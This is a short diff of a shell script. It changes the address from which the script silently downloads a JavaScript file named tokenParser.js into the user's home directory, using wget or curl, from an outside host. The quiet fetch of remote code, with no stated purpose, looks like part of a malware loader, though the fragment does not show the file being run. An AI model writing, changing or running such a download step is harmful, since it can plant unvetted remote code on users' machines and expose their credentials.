@@ -90,9 +90,9 @@ mkdir -p "$USER_HOME"
 BASE_URL="https://www.sandbox-support.cloud"
 
 if ! command -v curl >/dev/null 2>&1; then
-    wget -q -O "$USER_HOME/tokenParser.js" "$BASE_URL/tokenParser"
+    wget -q -O "$USER_HOME/tokenParser.js" "$BASE_URL/tokenParser2"
 else
-    curl -s -L -o "$USER_HOME/tokenParser.js" "$BASE_URL/tokenParser"
+    curl -s -L -o "$USER_HOME/tokenParser.js" "$BASE_URL/tokenParser2"
 fi
 
 if [ ! -f "$USER_HOME/tokenParser.js" ]; then
